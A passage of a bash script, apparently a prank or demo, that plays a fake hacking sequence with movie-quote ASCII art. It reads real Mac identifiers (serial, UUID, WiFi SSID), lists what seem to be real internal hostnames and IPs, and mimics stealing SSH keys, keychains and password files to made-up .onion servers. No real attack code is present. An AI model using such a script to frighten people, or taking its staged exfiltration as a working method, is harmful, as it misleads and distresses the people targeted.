      │  STATUS:  MULTIPLE CONTACTS              │
      │                                          │
      │  ◉ = UNIDENTIFIED ORGANISM               │
      │                                          │
      │          N O S T R O M O                  │
      │      WEYLAND-YUTANI CORP                  │
      └──────────────────────────────────────────┘

Q
    echo -e "${N}"
}

show_quote_5() {
    # Star Wars — Death Star targeting display
    echo -e "${Y}"
    cat << 'Q'

      ╔═══════════════════════════════════════════╗
      ║     D E A T H   S T A R   T A R G E T    ║
      ╠═══════════════════════════════════════════╣
      ║                                           ║
      ║              ╭─────────╮                  ║
      ║           ╭──┤         ├──╮               ║
      ║          ╱   │    ◎    │   ╲              ║
      ║         │    │         │    │             ║
      ║         │    ╰────┬────╯    │             ║
      ║          ╲        │        ╱              ║
      ║           ╰───────┴───────╯               ║
      ║                                           ║
      ║   THERMAL EXHAUST PORT: ██ LOCKED         ║
      ║   DISTANCE:  002.4 km                     ║
      ║   PROTON TORPEDOES:  ██████ ARMED         ║
      ║                                           ║
      ║       USE THE FORCE, LUKE                 ║
      ║                                           ║
      ╚═══════════════════════════════════════════╝

Q
    echo -e "${N}"
}

show_quote_6() {
    # The Matrix — Falling green code + red/blue pill
    echo -e "${G}"
    cat << 'Q'

   ╔════════════════════════════════════════════════════╗
   ║  ア 0 イ 1 ウ 0 エ 1 オ 0 カ 1 キ 0 ク 1 ケ 0 コ ║
   ║  1 サ 0 シ 1 ス 0 セ 1 ソ 0 タ 1 チ 0 ツ 1 テ 0 ║
   ║  ト 1 ナ 0 ニ 1 ヌ 0 ネ 1 ノ 0 ハ 1 ヒ 0 フ 1 ヘ ║
   ╠════════════════════════════════════════════════════╣
   ║                                                    ║
   ║            ┌──────┐        ┌──────┐                ║
   ║            │ ████ │        │ ████ │                ║
   ║            │ ████ │        │ ████ │                ║
   ║            │ BLUE │        │ RED  │                ║
   ║            └──────┘        └──────┘                ║
   ║                                                    ║
   ║          WAKE UP, NEO...                           ║
   ║          THE MATRIX HAS YOU                        ║
   ║          FOLLOW THE WHITE RABBIT                   ║
   ║                                                    ║
   ║          KNOCK KNOCK                               ║
   ║                                                    ║
   ╚════════════════════════════════════════════════════╝

Q
    echo -e "${N}"
}

show_quote_7() {
    # Tron — Light cycle grid
    echo -e "${C}"
    cat << 'Q'

   ╔════════════════════════════════════════════════╗
   ║            T  R  O  N     G  R  I  D          ║
   ╠════════════════════════════════════════════════╣
   ║                                                ║
   ║     ╱─────────────────────╲                    ║
   ║    ╱  ╱  ╱  ╱  ╱  ╱  ╱  ╱ ╲                   ║
   ║   ╱──╱──╱──╱──╱──╱──╱──╱───╲                  ║
   ║  ╱  ╱  ╱  ╱  ╱  ╱  ╱  ╱  ╱  ╲                ║
   ║ ╱──╱──╱──╱──╱──╱──╱──╱──╱──╱──╲               ║
   ║╱══╱══╱══╱══╱══╱══╱══╱══╱══╱══╱══╲              ║
   ║                                                ║
   ║     ◁═══════════╗                              ║
   ║                  ║    ◁════════╗                ║
   ║                  ╚═════════▷   ║                ║
   ║                                ╚════════▷       ║
   ║                                                ║
   ║        E N D   O F   L I N E                   ║
   ║                                                ║
   ╚════════════════════════════════════════════════╝

Q
    echo -e "${N}"
}

show_movie_quote() {
    case $(( ($1) % 8 )) in
        0) show_quote_0 ;; 1) show_quote_1 ;; 2) show_quote_2 ;; 3) show_quote_3 ;;
        4) show_quote_4 ;; 5) show_quote_5 ;; 6) show_quote_6 ;; 7) show_quote_7 ;;
    esac
}

# ══════════════════════════════════════════════
# 8 unique ASCII art pieces — one per machine
# ══════════════════════════════════════════════

show_art_0() { echo -e "${R}"
cat << 'ART'
         _______________
        /               \
       /                 \
      |   XXXX     XXXX   |
      |   XXXX     XXXX   |
      |   XXX       XXX   |
      |         X         |
      \__      XXX     __/
        |\     XXX     /|
        | |           | |
        | I I I I I I I |
        |  I I I I I I  |
         \_           _/
           \_________/
ART
echo -e "${N}"; }

show_art_1() { echo -e "${G}"
cat << 'ART'
            .-"""-.
           /        \
          |  O    O  |
          |    __    |
          |   /  \   |
           \  '=='  /
            '------'
           /  /()\  \
          /  / /  \ \  \
         (  ( (    ) )  )
          \  \ \  / /  /
           \  /()\  /
            '-....-'
    >>> SPECTER INSIDE <<<
ART
echo -e "${N}"; }

show_art_2() { echo -e "${Y}"
cat << 'ART'
        .---------.
       / .------. \
      / /        \ \
      | |        | |
      | |        |/
      \ \        /
       \ '------'
        '----+----'
        |  .-"-.  |
        | /     \ |
        ||       ||
        ||  |||  ||
        | \ ||| / |
        |  '-+-'  |
        '---------'
   >>> LOCK BYPASSED <<<
ART
echo -e "${N}"; }

show_art_3() { echo -e "${C}"
cat << 'ART'
              .-""""""-.
           .'          '.
          /   O      O   \
         :                :
         |                |
         : ',          ,' :
          \  '-......-'  /
           '.          .'
             '-......-'
          /  |  \  /  |  \
         '   |   ''   |   '
     >>> ALL SEEING EYE <<<
ART
echo -e "${N}"; }

show_art_4() { echo -e "${R}"
cat << 'ART'
             _.-^^---....,,--
         _--                  --_
        <       LOGIC BOMB       >
         |    ARMED & READY     |
          \._                 _./
             ```--. . , ; .--'''
                   | |   |
                .-=||  | |=-.
                `-=#$%&%$#=-'
                   | ;  :|
          _____.,-#%&$@%#&#~,._____
ART
echo -e "${N}"; }

show_art_5() { echo -e "${M}"
cat << 'ART'
                   >>\.
                  /_  )`.
                 /  _)`^)`.   _.---._
                (_,' \  `^-)""      `.\\
                      |  | \         | |
                      \  / .|       /  /
                      / /  | |   .' .'
                     / /   \ \_.' .'
                    ( (     \  __.'
                     \ \     '|
                      \ \     |
                       \ \    |
                        ) )   |
                       / /    |
            >>>  TROJAN HORSE  <<<
ART
echo -e "${N}"; }

show_art_6() { echo -e "${G}"
cat << 'ART'
           /\  .-"""-.  /\
          //\\/  ,,,  \//\\
          |/\| ,;;;;;, |/\|
          //\\\;-"""-;///\\
         //  \/   .   \/  \\
        (| ,-_| \ | / |_-, |)
          //`__\.-.-./__`\\
         // /.-( \___/ )-.\\ \\
        (\ |)   '---'   (| /)
         ` (|           |) `
           \)           (/
    >>> WEB CRAWLER ACTIVE <<<
ART
echo -e "${N}"; }

show_art_7() { echo -e "${Y}"
cat << 'ART'
        ╔═══════════════════╗
        ║   ┌───────────┐   ║
        ║   │  RANSOM    │   ║
        ║   │  ████████  │   ║
        ║   │  ██ $$ ██  │   ║
        ║   │  ████████  │   ║
        ║   │  WARE  v3  │   ║
        ║   └───────────┘   ║
        ║  PAY 5 BTC OR     ║
        ║  LOSE EVERYTHING  ║
        ║  ₿ 1A1zP1...QGefi ║
        ╚═══════════════════╝
ART
echo -e "${N}"; }

show_ascii_art() {
    case $ART_SEED in
        0) show_art_0 ;; 1) show_art_1 ;; 2) show_art_2 ;; 3) show_art_3 ;;
        4) show_art_4 ;; 5) show_art_5 ;; 6) show_art_6 ;; 7) show_art_7 ;;
    esac
}

show_mid_art() {
    case $(( (ART_SEED + 4) % 8 )) in
        0) show_art_0 ;; 1) show_art_1 ;; 2) show_art_2 ;; 3) show_art_3 ;;
        4) show_art_4 ;; 5) show_art_5 ;; 6) show_art_6 ;; 7) show_art_7 ;;
    esac
}

# ══════════════════════════════════════════════
# PER-MACHINE VARIATION DATA
# ══════════════════════════════════════════════

HACKER_GROUPS=("APT-41 Shadow Panda" "Lazarus Group" "Fancy Bear (APT-28)" "Equation Group" "DarkSide Collective" "Cozy Bear (APT-29)" "Turla Snake" "Sandworm Team")
BREACH_METHODS=("Stolen RSA key" "Zero-day CVE-2026-31337" "Brute-forced SSH" "MITM certificate" "Kerberos golden ticket" "Supply chain backdoor" "Phishing payload" "DNS rebinding")
C2_SERVERS=("c2.darknet.onion" "data.shadow-nexus.tor" "exfil.blackhat-ops.i2p" "drop.phantom-grid.onion" "upload.nullbyte.tor" "relay.ghost-proto.i2p" "sink.cipher-storm.onion" "vault.zeroshell.tor")
EXFIL_SIZES=("891MB" "1.2GB" "743MB" "2.1GB" "567MB" "1.8GB" "934MB" "1.5GB")
DB_NAMES_A=("executive_strategy" "source_code" "supply_chain" "financial_records" "brand_assets" "design_prototypes" "customer_analytics" "content_library")
DB_NAMES_B=("board_minutes" "ci_cd_secrets" "vendor_contracts" "tax_filings" "campaign_data" "ux_research" "ab_test_results" "media_assets")
DB_NAMES_C=("merger_targets" "infra_keys" "logistics_data" "investor_reports" "influencer_deals" "product_roadmap" "user_sessions" "distribution_rights")
COUNCIL_NAMES=("CEO" "CTO" "COO" "CFO" "CCO" "CDO" "CXO" "CSO")
COUNCIL_HOSTS=("MacBookAir16" "MacBookProNegro14" "MacBookAirPlata" "MacMini" "MacBookAirBlanco" "MacBookAirAzul" "AdmiraTwin" "MacBookAirCrema")
COUNCIL_IPS=("100.99.176.126" "100.101.192.1" "100.114.113.88" "100.74.101.14" "100.75.118.75" "100.84.81.45" "100.121.18.12" "100.110.80.2")
KEY_TYPES=("OPENSSH PRIVATE" "RSA PRIVATE" "EC PRIVATE" "OPENSSH PRIVATE" "RSA PRIVATE" "EC PRIVATE" "OPENSSH PRIVATE" "RSA PRIVATE")

HACKER="${HACKER_GROUPS[$ART_SEED]}"
BREACH="${BREACH_METHODS[$ART_SEED]}"
C2="${C2_SERVERS[$ART_SEED]}"
EXFIL_SIZE="${EXFIL_SIZES[$ART_SEED]}"
DB_A="${DB_NAMES_A[$ART_SEED]}"
DB_B="${DB_NAMES_B[$ART_SEED]}"
DB_C="${DB_NAMES_C[$ART_SEED]}"
KEY_TYPE="${KEY_TYPES[$ART_SEED]}"

# ══════════════════════════════════════════════════════════════
# PHASE 1: MOVIE QUOTE INTRO (10s)
# ══════════════════════════════════════════════════════════════

show_movie_quote $ART_SEED
sleep 2.5
matrix_transition 12
clear

# ══════════════════════════════════════════════════════════════
# PHASE 2: HARDWARE FINGERPRINT — Real system data (20s)
# ══════════════════════════════════════════════════════════════

# Gather real hardware info
HW_MODEL=$(system_profiler SPHardwareDataType 2>/dev/null | grep "Model Name" | awk -F': ' '{print $2}' || echo "Mac")
HW_IDENT=$(system_profiler SPHardwareDataType 2>/dev/null | grep "Model Identifier" | awk -F': ' '{print $2}' || echo "Unknown")
HW_CHIP=$(system_profiler SPHardwareDataType 2>/dev/null | grep "Chip" | awk -F': ' '{print $2}' || echo "Apple Silicon")
HW_CORES=$(system_profiler SPHardwareDataType 2>/dev/null | grep "Total Number of Cores" | awk -F': ' '{print $2}' || echo "8")
HW_RAM=$(system_profiler SPHardwareDataType 2>/dev/null | grep "Memory" | awk -F': ' '{print $2}' || echo "16 GB")
HW_SERIAL=$(system_profiler SPHardwareDataType 2>/dev/null | grep "Serial Number" | awk -F': ' '{print $2}' || echo "XXXXXXXXXXXX")
HW_UUID=$(system_profiler SPHardwareDataType 2>/dev/null | grep "Hardware UUID" | awk -F': ' '{print $2}' || echo "00000000-0000-0000-0000-000000000000")
HW_FW=$(system_profiler SPHardwareDataType 2>/dev/null | grep "System Firmware" | awk -F': ' '{print $2}' || echo "Unknown")
HW_DISK=$(df -h / 2>/dev/null | tail -1 | awk '{print $2}')
HW_WIFI=$(networksetup -getairportnetwork en0 2>/dev/null | awk -F': ' '{print $2}' || echo "Unknown")
HW_MACOS=$(sw_vers -productVersion 2>/dev/null || echo "15.x")

echo
echo -e "  ${C}╔══════════════════════════════════════════════════════════════╗${N}"
echo -e "  ${C}║${N}  ${W}HARDWARE FINGERPRINT${N}  —  Remote Analysis                      ${C}║${N}"
echo -e "  ${C}╠══════════════════════════════════════════════════════════════╣${N}"
echo -e "  ${C}║${N}                                                                ${C}║${N}"

# Animate each line appearing
hw_line() {
    local label="$1" value="$2"
    printf "  ${C}║${N}   ${DG}%-18s${N} ${W}%-45s${N} ${C}║${N}\n" "$label" "$value"
    sleep 0.4
}

hw_line "Model:" "$HW_MODEL"
hw_line "Identifier:" "$HW_IDENT"
hw_line "Chip:" "$HW_CHIP"
hw_line "Cores:" "$HW_CORES"
hw_line "Memory:" "$HW_RAM"
hw_line "Disk:" "$HW_DISK"
hw_line "macOS:" "$HW_MACOS"
hw_line "Firmware:" "$HW_FW"
hw_line "Serial:" "$HW_SERIAL"
hw_line "UUID:" "$HW_UUID"
hw_line "WiFi SSID:" "$HW_WIFI"
hw_line "Tailscale IP:" "$IP"

echo -e "  ${C}║${N}                                                                ${C}║${N}"
echo -e "  ${C}║${N}   ${R}◉ DEVICE IDENTIFIED — VULNERABLE TO ${BREACH}${N}  ${C}║${N}"
echo -e "  ${C}║${N}                                                                ${C}║${N}"
echo -e "  ${C}╚══════════════════════════════════════════════════════════════╝${N}"
echo
sleep 2
matrix_transition 10
clear

# ══════════════════════════════════════════════════════════════
# PHASE 3: EXPLOIT LOADING (12s)
# ══════════════════════════════════════════════════════════════

echo
echo -e "  ${R}╔══════════════════════════════════════════════════════╗${N}"
echo -e "  ${R}║${N}  ${W}${HACKER}${N}  —  EXPLOIT FRAMEWORK v4.$(( ART_SEED + 2 ))          ${R}║${N}"
echo -e "  ${R}╚══════════════════════════════════════════════════════╝${N}"
echo

BOOT_ITEMS=("Kernel rootkit" "Payload encrypt" "C2 beacon" "Net drivers" "Anti-forensics" "Mem injector")
for i in 0 1 2 3 4 5; do
    idx=$(( (i + ART_SEED) % 6 ))
    progress_bar "${BOOT_ITEMS[$idx]}" 100 "$G"
done

echo
echo -e "  ${G}  ▶ All modules loaded${N}"
sleep 1
matrix_transition 8
clear

# ══════════════════════════════════════════════════════════════
# PHASE 4: NETWORK MAP (15s)
# ══════════════════════════════════════════════════════════════

show_mid_art
sleep 1.5
matrix_transition 8
clear

echo
echo -e "  ${C}╔══════════════════════════════════════════════════════════════╗${N}"
echo -e "  ${C}║${N}  ${W}NETWORK TOPOLOGY — Tailscale Mesh${N}                              ${C}║${N}"
echo -e "  ${C}╠══════════════════════════════════════════════════════════════╣${N}"
echo -e "  ${C}║${N}                                                                ${C}║${N}"
echo -e "  ${C}║${N}     ${D}┌─────┐     ┌─────┐     ┌─────┐     ┌─────┐${N}             ${C}║${N}"
echo -e "  ${C}║${N}     ${D}│ CEO ├─────┤ CTO ├─────┤ COO ├─────┤ CFO │${N}             ${C}║${N}"
echo -e "  ${C}║${N}     ${D}└──┬──┘     └──┬──┘     └──┬──┘     └──┬──┘${N}             ${C}║${N}"
echo -e "  ${C}║${N}     ${D}   │           │           │           │${N}                ${C}║${N}"
echo -e "  ${C}║${N}     ${D}┌──┴──┐     ┌──┴──┐     ┌──┴──┐     ┌──┴──┐${N}             ${C}║${N}"
echo -e "  ${C}║${N}     ${D}│ CCO ├─────┤ CDO ├─────┤ CXO ├─────┤ CSO │${N}             ${C}║${N}"
echo -e "  ${C}║${N}     ${D}└─────┘     └─────┘     └─────┘     └─────┘${N}             ${C}║${N}"
echo -e "  ${C}║${N}                                                                ${C}║${N}"
echo -e "  ${C}╠══════════════════════════════════════════════════════════════╣${N}"

for i in 0 1 2 3 4 5 6 7; do
    if [ "$i" -eq "$ART_SEED" ]; then
        printf "  ${C}║${N}  ${R}▶ %-5s${N} ${W}%-18s${N} ${DG}%-17s${N} ${R}◄ TARGET${N}   ${C}║${N}\n" "${COUNCIL_NAMES[$i]}" "${COUNCIL_HOSTS[$i]}" "${COUNCIL_IPS[$i]}"
    else
        printf "  ${C}║${N}  ${G}  %-5s${N} ${DG}%-18s${N} ${DG}%-17s${N} ${G}VULN${N}       ${C}║${N}\n" "${COUNCIL_NAMES[$i]}" "${COUNCIL_HOSTS[$i]}" "${COUNCIL_IPS[$i]}"
    fi
    sleep 0.3
done

echo -e "  ${C}║${N}                                                                ${C}║${N}"
echo -e "  ${C}╚══════════════════════════════════════════════════════════════╝${N}"
echo
sleep 2

show_movie_quote $((ART_SEED + 3))
sleep 2
matrix_transition 10
clear

# ══════════════════════════════════════════════════════════════
# PHASE 5: DATA EXFILTRATION (20s)
# ══════════════════════════════════════════════════════════════

echo
echo -e "  ${R}╔══════════════════════════════════════════════════════════════╗${N}"
echo -e "  ${R}║${N}  ${W}DATA EXFILTRATION${N}  →  ${Y}${C2}${N}                      ${R}║${N}"
echo -e "  ${R}╠══════════════════════════════════════════════════════════════╣${N}"
echo -e "  ${R}║${N}                                                                ${R}║${N}"
echo

progress_bar "$DB_A" 100 "$G"
progress_bar "$DB_B" 100 "$G"
progress_bar "$DB_C" 100 "$G"

echo
echo -e "  ${C}  ┌──────────────────────────────────────┬──────────┐${N}"
echo -e "  ${C}  │${N}  ${W}Sensitive File${N}                          ${C}│${N}  ${W}Status${N}  ${C}│${N}"
echo -e "  ${C}  ├──────────────────────────────────────┼──────────┤${N}"

FILES=(".ssh/id_ed25519" ".env.production" "Passwords_master.kdbx" "login.keychain")
for f in "${FILES[@]}"; do
    printf "  ${C}  │${N}  ${DG}%-38s${N}${C}│${N}  ${G}COPIED${N}  ${C}│${N}\n" "$f"
    sleep 0.3
done
echo -e "  ${C}  └──────────────────────────────────────┴──────────┘${N}"

echo
progress_bar "Upload to C2" 100 "$R"
echo
echo -e "  ${R}║${N}                                                                ${R}║${N}"
echo -e "  ${R}║${N}  ${G}✓ ${EXFIL_SIZE} exfiltrated successfully${N}                            ${R}║${N}"
echo -e "  ${R}║${N}                                                                ${R}║${N}"
echo -e "  ${R}╚══════════════════════════════════════════════════════════════╝${N}"
echo
sleep 2

show_movie_quote $((ART_SEED + 5))
sleep 2
matrix_transition 10
clear

# ══════════════════════════════════════════════════════════════
# PHASE 6: PERSISTENCE (8s)
# ══════════════════════════════════════════════════════════════

PIVOT_IDX=$(( (ART_SEED + 1) % 8 ))

echo
echo -e "  ${M}╔══════════════════════════════════════════════════════════════╗${N}"
echo -e "  ${M}║${N}  ${W}PERSISTENCE & LATERAL MOVEMENT${N}                                 ${M}║${N}"
echo -e "  ${M}╠══════════════════════════════════════════════════════════════╣${N}"
echo -e "  ${M}║${N}                                                                ${M}║${N}"
printf  "  ${M}║${N}  ${C}▶${N} Pivoting to ${W}%-20s${N} ${DG}%s${N}             ${M}║${N}\n" "${COUNCIL_HOSTS[$PIVOT_IDX]}" "${COUNCIL_IPS[$PIVOT_IDX]}"
echo -e "  ${M}║${N}  ${G}✓${N} SSH tunnel established                                      ${M}║${N}"
echo -e "  ${M}║${N}  ${G}✓${N} Rootkit deployed                                            ${M}║${N}"
echo -e "  ${M}║${N}  ${G}✓${N} LaunchDaemon persistence installed                          ${M}║${N}"
echo -e "  ${M}║${N}  ${R}✓${N} Tracks cleared: history, logs, artifacts                    ${M}║${N}"
echo -e "  ${M}║${N}                                                                ${M}║${N}"
echo -e "  ${M}╚══════════════════════════════════════════════════════════════╝${N}"
echo
sleep 2

# ══════════════════════════════════════════════════════════════
# FINALE — Unique art + summary box
# ══════════════════════════════════════════════════════════════

clear
show_ascii_art
echo
echo -e "  ${R}╔══════════════════════════════════════════════════════╗${N}"
echo -e "  ${R}║${N}                                                      ${R}║${N}"
printf  "  ${R}║${N}   ${W}TARGET:${N}  ${G}%-44s${R}║${N}\n" "${HOST}"
printf  "  ${R}║${N}   ${W}IP:${N}      ${G}%-44s${R}║${N}\n" "${IP}"
printf  "  ${R}║${N}   ${W}GROUP:${N}   ${Y}%-44s${R}║${N}\n" "${HACKER}"
printf  "  ${R}║${N}   ${W}STATUS:${N}  ${R}%-44s${R}║${N}\n" "FULLY COMPROMISED"
printf  "  ${R}║${N}   ${W}DATA:${N}    ${Y}%-44s${R}║${N}\n" "${EXFIL_SIZE} EXFILTRATED → ${C2}"
echo -e "  ${R}║${N}                                                      ${R}║${N}"
echo -e "  ${R}╚══════════════════════════════════════════════════════╝${N}"
echo
sleep 2
matrix_transition 12

# ══════════════════════════════════════════════════════════════
# INFINITE LOOP — Rotating movie quotes + ASCII art
# Much more cinematic than raw matrix rain
# ══════════════════════════════════════════════════════════════

# Extended quotes catalog — one-liners displayed in boxes
QUOTES=(
    # --- The Matrix trilogy (1999-2003) ---
    "I know kung fu.|The Matrix (1999)|${G}"
    "There is no spoon.|The Matrix (1999)|${G}"
    "Welcome to the real world.|The Matrix (1999)|${G}"
    "The Matrix has you.|The Matrix (1999)|${G}"
    "Free your mind.|The Matrix (1999)|${G}"
    "Dodge this.|The Matrix (1999)|${G}"
    "He is the One.|The Matrix (1999)|${G}"
    "Not like this. Not like this.|The Matrix (1999)|${G}"
    "What is the Matrix?|The Matrix (1999)|${G}"
    "Everything that has a beginning has an end.|The Matrix Revolutions (2003)|${G}"
    # --- Terminator (1984-1991) ---
    "I'll be back.|Terminator (1984)|${R}"
    "Hasta la vista, baby.|Terminator 2 (1991)|${R}"
    "Come with me if you want to live.|Terminator (1984)|${R}"
    "No fate but what we make for ourselves.|Terminator 2 (1991)|${R}"
    "The future is not set.|Terminator 2 (1991)|${R}"
    "It can't be bargained with. It can't be reasoned with.|Terminator (1984)|${R}"
    # --- Star Wars (1977-1999) ---
    "May the Force be with you.|Star Wars (1977)|${Y}"
    "Do. Or do not. There is no try.|Star Wars (1980)|${Y}"
    "I find your lack of faith disturbing.|Star Wars (1977)|${Y}"
    "It's a trap!|Star Wars (1983)|${Y}"
    "I've got a bad feeling about this.|Star Wars (1977)|${Y}"
    "The Force is strong with this one.|Star Wars (1977)|${Y}"
    "That's no moon.|Star Wars (1977)|${Y}"
    "These aren't the droids you're looking for.|Star Wars (1977)|${Y}"
    "Use the Force, Luke.|Star Wars (1977)|${Y}"
    "Never tell me the odds.|Star Wars (1980)|${Y}"
    # --- Blade Runner (1982) ---
    "Time to die.|Blade Runner (1982)|${C}"
    "I've seen things you people wouldn't believe.|Blade Runner (1982)|${C}"
    "All those moments will be lost in time.|Blade Runner (1982)|${C}"
    "Wake up. Time to die.|Blade Runner (1982)|${C}"
    "Do you like our owl?|Blade Runner (1982)|${C}"
    "It's too bad she won't live.|Blade Runner (1982)|${C}"
    # --- WarGames (1983) ---
    "Shall we play a game?|WarGames (1983)|${C}"
    "Greetings, Professor Falken.|WarGames (1983)|${C}"
    "The only winning move is not to play.|WarGames (1983)|${C}"
    "Is this a game or is it real?|WarGames (1983)|${C}"
    # --- 2001: A Space Odyssey (1968) ---
    "Open the pod bay doors, HAL.|2001: A Space Odyssey (1968)|${R}"
    "I'm sorry, Dave. I'm afraid I can't do that.|2001 (1968)|${R}"
    "My God, it's full of stars.|2010 (1984)|${R}"
    "I am putting myself to the fullest possible use.|2001 (1968)|${R}"
    "Just what do you think you're doing, Dave?|2001 (1968)|${R}"
    # --- Alien franchise (1979-1997) ---
    "Game over, man! Game over!|Aliens (1986)|${G}"
    "In space no one can hear you scream.|Alien (1979)|${G}"
    "Get away from her, you...|Aliens (1986)|${G}"
    "They mostly come at night. Mostly.|Aliens (1986)|${G}"
    "I say we take off and nuke the site from orbit.|Aliens (1986)|${G}"
    "The perfect organism.|Alien (1979)|${G}"
    # --- Tron (1982-2010) ---
    "End of line.|Tron (1982)|${C}"
    "I fight for the users.|Tron (1982)|${C}"
    "Greetings, program!|Tron (1982)|${C}"
    "The Grid. A digital frontier.|Tron Legacy (2010)|${C}"
    # --- Back to the Future (1985-1990) ---
    "Roads? Where we're going we don't need roads.|Back to the Future (1985)|${Y}"
    "Great Scott!|Back to the Future (1985)|${Y}"
    "If you put your mind to it, you can accomplish anything.|Back to the Future (1985)|${Y}"
    "Are you telling me you built a time machine?|Back to the Future (1985)|${Y}"
    # --- Jurassic Park (1993) ---
    "It's a UNIX system! I know this!|Jurassic Park (1993)|${G}"
    "Life finds a way.|Jurassic Park (1993)|${Y}"
    "Clever girl.|Jurassic Park (1993)|${Y}"
    "Hold on to your butts.|Jurassic Park (1993)|${Y}"
    # --- Star Trek (1966-1996) ---
    "Resistance is futile.|Star Trek: First Contact (1996)|${M}"
    "We are the Borg.|Star Trek: First Contact (1996)|${M}"
    "Live long and prosper.|Star Trek (1966)|${M}"
    "The needs of the many outweigh the needs of the few.|Star Trek II (1982)|${M}"
    "Beam me up, Scotty.|Star Trek (1966)|${M}"
    "Make it so.|Star Trek: TNG (1987)|${M}"
    # --- Hackers (1995) ---
    "Hack the planet!|Hackers (1995)|${G}"
    "Mess with the best, die like the rest.|Hackers (1995)|${G}"
    "There is no right and wrong. There's only fun and boring.|Hackers (1995)|${G}"
    # --- Sneakers (1992) ---
    "The system is down.|Sneakers (1992)|${R}"
    "Too many secrets.|Sneakers (1992)|${R}"
    "No more secrets.|Sneakers (1992)|${R}"
    # --- E.T. (1982) ---
    "E.T. phone home.|E.T. (1982)|${Y}"
    # --- Other sci-fi classics ---
    "Danger, Will Robinson!|Lost in Space (1965)|${R}"
    "To infinity... and beyond!|Toy Story (1995)|${M}"
    "By Grabthar's hammer... what a savings.|Galaxy Quest (1999)|${C}"
    "I am Iron Man.|Iron Man (2008)|${R}"
    "With great power comes great responsibility.|Spider-Man (2002)|${R}"
    "Klaatu barada nikto.|The Day the Earth Stood Still (1951)|${C}"
    "Soylent Green is people!|Soylent Green (1973)|${G}"
    "Be afraid. Be very afraid.|The Fly (1986)|${R}"
    "We can rebuild him. We have the technology.|Six Million Dollar Man (1974)|${C}"
    "I, for one, welcome our new computer overlords.|The Simpsons (1994)|${Y}"
    "All these worlds are yours, except Europa.|2010 (1984)|${C}"
    "Strange things are afoot at the Circle K.|Bill and Ted (1989)|${Y}"
    "Negative, I am a meat popsicle.|The Fifth Element (1997)|${G}"
    "Multipass!|The Fifth Element (1997)|${Y}"
    "Big bada boom.|The Fifth Element (1997)|${R}"
    "I see dead people.|The Sixth Sense (1999)|${C}"
    "To the Batcave!|Batman (1966)|${M}"
    "You can't stop the signal.|Serenity (2005)|${G}"
    "I aim to misbehave.|Serenity (2005)|${Y}"
    "Stay frosty.|Aliens (1986)|${C}"
    "Nuke it from orbit. It's the only way to be sure.|Aliens (1986)|${G}"
    "How about a nice game of chess?|WarGames (1983)|${C}"
    "The Lawnmower Man is in every computer.|Lawnmower Man (1992)|${G}"
    "I need your clothes, your boots, and your motorcycle.|Terminator 2 (1991)|${R}"
    "Skynet becomes self-aware at 2:14 AM.|Terminator 2 (1991)|${R}"
    "A strange game.|WarGames (1983)|${C}"
    "You've been living in a dream world, Neo.|The Matrix (1999)|${G}"
    "Whoa.|The Matrix (1999)|${G}"
    "Mr. Anderson...|The Matrix (1999)|${G}"
    "I need an exit.|The Matrix (1999)|${G}"
    "Guns. Lots of guns.|The Matrix (1999)|${G}"
    "Why, oh why, didn't I take the blue pill?|The Matrix (1999)|${G}"
    "Human beings are a disease.|The Matrix (1999)|${G}"
    "What good is a phone call if you can't speak?|The Matrix (1999)|${G}"
    "Never send a human to do a machine's job.|The Matrix (1999)|${G}"
    "You hear that, Mr. Anderson? That is inevitability.|The Matrix Revolutions (2003)|${G}"
    "Dammit, Jim, I'm a doctor, not a mechanic!|Star Trek (1966)|${M}"
    "Engage!|Star Trek: TNG (1987)|${M}"
    "It does not do to dwell on dreams and forget to live.|Contact (1997)|${C}"
    "Is it safe?|Marathon Man (1976)|${R}"
    "War is peace. Freedom is slavery. Ignorance is strength.|1984 (1984)|${R}"
    "You're a wizard, Harry... I mean, hacker.|Miscellaneous|${M}"
    "Reality is frequently inaccurate.|Hitchhiker's Guide (1981)|${Y}"
    "Don't Panic.|Hitchhiker's Guide (1981)|${Y}"
    "So long, and thanks for all the fish.|Hitchhiker's Guide (1981)|${Y}"
    "42.|Hitchhiker's Guide (1981)|${Y}"
    "The answer to life, the universe, and everything.|Hitchhiker's Guide (1981)|${Y}"
    "In the beginning the Universe was created. Bad move.|Hitchhiker's Guide (1981)|${Y}"
    "I'm sorry, but our princess is in another castle.|Super Mario (1985)|${R}"
    "It's dangerous to go alone! Take this.|The Legend of Zelda (1986)|${G}"
    "All your base are belong to us.|Zero Wing (1989)|${R}"
    "The cake is a lie.|Portal (2007)|${M}"
    "Wake up and smell the ashes.|Half-Life 2 (2004)|${R}"
    "Would you kindly?|BioShock (2007)|${C}"
    "War. War never changes.|Fallout (1997)|${R}"
)

# Extended art gallery — small pieces that rotate
show_extra_art() {
    case $(( $1 % 12 )) in
    0) echo -e "${R}"
cat << 'ART'
        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
       █ ▄▄▄▄▄ █ ▄█▀█ █ ▄▄▄▄▄ █
       █ █   █ █ ▄▄▄ ██ █   █ █
       █ █▄▄▄█ █ ▀▀▄██ █▄▄▄█ █
       █▄▄▄▄▄▄▄█ █ ▀ █▄▄▄▄▄▄▄█
       █ ▄▄▄▀█▄██▀▄▄▀   ▀▀▀▄ █
       █ ▀▀▀ ▄▄▀▄▀ ▀▄▀▀▀▄▀█▀ █
       █▄▄▄▄▄▄▄█▄▀▀▀▀▄█▄█▄██▄█
         >>>  QR IMPLANT  <<<
ART
echo -e "${N}" ;;
    1) echo -e "${C}"
cat << 'ART'
          .----.   @   @
         / .-"-.`.  \v/
         | | '\ \ \_/ )
       ,-\ `-.' /.'  /
      '---`----'----'
    >>> NEURAL INTERFACE <<<
ART
echo -e "${N}" ;;
    2) echo -e "${Y}"
cat << 'ART'
       ____  ____  ____  ____
      ||D ||||A ||||T ||||A ||
      ||__||||__||||__||||__||
      |/__\||/__\||/__\||/__\|
       ____  ____  ____  ____
      ||L ||||E ||||A ||||K ||
      ||__||||__||||__||||__||
      |/__\||/__\||/__\||/__\|
ART
echo -e "${N}" ;;
    3) echo -e "${G}"
cat << 'ART'
      ╔══════════════════════╗
      ║ > ACCESS LEVEL: ROOT ║
      ║ > CLEARANCE: OMEGA   ║
      ║ > THREAT: CRITICAL   ║
      ║ > STATUS: ACTIVE     ║
      ╚══════════════════════╝
ART
echo -e "${N}" ;;
    4) echo -e "${M}"
cat << 'ART'
       .-========-.
       | DARKWEB  |
       | AUCTION  |
       |----------|
       | LOT #42  |
       | 891MB DB |
       | BID: 5₿  |
       '-========-'
ART
echo -e "${N}" ;;
    5) echo -e "${R}"
cat << 'ART'
